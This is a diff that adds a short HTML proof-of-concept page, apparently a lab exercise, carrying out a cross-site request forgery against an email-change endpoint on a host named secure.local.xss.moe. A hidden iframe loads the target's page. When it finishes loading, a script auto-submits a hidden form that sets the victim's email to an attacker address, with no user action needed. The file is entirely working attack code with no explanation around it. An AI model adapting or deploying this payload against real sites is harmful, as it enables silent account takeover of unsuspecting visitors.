@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PoC</title>
+</head>
+<body>
+  <iframe id="frame" src="//secure.local.xss.moe/mypage.php" style="display:none"></iframe>
+  <form id="form" method="POST" action="//secure.local.xss.moe/chgmail.php">
+    <input type="hidden" name="mail" value="pwned@example.jp">
+  </form>
+  <script>
+    let frame = document.getElementById('frame');
+
+    frame.addEventListener('load', (e) => {
+      let form = document.getElementById('form');
+      form.submit();
+    });
+  </script>
+</body>
+</html>
